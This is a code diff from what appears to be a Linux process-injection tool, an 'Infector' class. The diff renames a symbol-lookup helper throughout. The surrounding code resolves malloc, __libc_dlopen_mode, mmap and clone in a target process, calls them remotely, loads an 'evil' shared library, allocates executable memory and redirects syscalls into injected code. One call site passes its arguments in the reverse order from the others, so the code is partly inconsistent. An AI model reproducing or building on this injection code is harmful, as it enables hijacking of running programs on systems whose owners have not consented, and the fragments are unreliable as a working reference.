@@ -126,8 +126,8 @@ bool Infector::updateTarget()
 
 bool Infector::createThread(Elf64_Addr funcAddr, Elf64_Addr paramAddr)
 {
-    Elf64_Addr mmapAddr = getSym(mLicSoname, "mmap");
-    Elf64_Addr cloneAddr = getSym(mLicSoname, "clone");
+    Elf64_Addr mmapAddr = getSymAddr(mLicSoname, "mmap");
+    Elf64_Addr cloneAddr = getSymAddr(mLicSoname, "clone");
     int stackSize = 1024*1024*8;
     long mmapRetAddr = callRemoteFunc(mmapAddr, NULL, stackSize, 
                                       PROT_READ | PROT_WRITE, 
@@ -166,8 +166,8 @@ bool Infector::stepTarget()
     return pTargetOpt->stepTarget();
 }
 
-Elf64_Addr Infector::getSym(const std::string &symname, 
-                            const std::string &soname)
+Elf64_Addr Infector::getSymAddr(const std::string &symname, 
+                                const std::string &soname)
 {
     Elf64Wrapper *pElf = TypeSingle<Elf64Wrapper>::getInstance();
     std::string soAllPath = "";
@@ -181,7 +181,7 @@ Elf64_Addr Infector::getSym(const std::string &symname,
     {
         for (auto &m : mapInfos)
         {
-            Elf64_Addr addr = pElf->getSym(m.first, symname);
+            Elf64_Addr addr = pElf->getSymAddr(m.first, symname);
             if (addr)
                 return addr;
         }
@@ -209,7 +209,7 @@ Elf64_Addr Infector::getSym(const std::string &symname,
             it = soMap.find(soname);
         }
         
-        return pElf->getSym(it->second, symname);
+        return pElf->getSymAddr(it->second, symname);
     }
 }
 
@@ -276,8 +276,8 @@ bool Infector::injectEvilSoname(const std::string &evilsoname)
         return false;
     }
 
-    Elf64_Addr mallocAddr = getSym("malloc", mLicSoname);
-    Elf64_Addr dlopenAddr = getSym("__libc_dlopen_mode", mLicSoname);
+    Elf64_Addr mallocAddr = getSymAddr("malloc", mLicSoname);
+    Elf64_Addr dlopenAddr = getSymAddr("__libc_dlopen_mode", mLicSoname);
     if (!mallocAddr || !dlopenAddr)
     {
         LOGGER_ERROR << "parse sym error:";
@@ -334,9 +334,9 @@ Elf64_Addr Infector::syscallJmp(const std::string &syscall,
                                 const std::string &setSyscall, 
                                 Elf64_Addr tmpAddr)
 {
-    Elf64_Addr syscallAddr = getSym(syscall, mLicSoname);
-    Elf64_Addr injectCallAddr = getSym(injectCall, mEvilSoname);
-    Elf64_Addr setSyscallAddr = getSym(setSyscall, mEvilSoname);
+    Elf64_Addr syscallAddr = getSymAddr(syscall, mLicSoname);
+    Elf64_Addr injectCallAddr = getSymAddr(injectCall, mEvilSoname);
+    Elf64_Addr setSyscallAddr = getSymAddr(setSyscall, mEvilSoname);
     if (!syscallAddr || !injectCallAddr || !setSyscallAddr)
     {
         LOGGER_ERROR << "parse sym error";
@@ -355,7 +355,7 @@ bool Infector::injectSysTableInit()
     if (mEvilSoname.empty())
         return false;
 
-    Elf64_Addr mmapAddr = getSym("mmap", mLicSoname);
+    Elf64_Addr mmapAddr = getSymAddr("mmap", mLicSoname);
 
     Elf64_Addr mmapRetAddr = callRemoteFunc(mmapAddr, 0, 4096, 
                                 PROT_READ | PROT_WRITE | PROT_EXEC, 
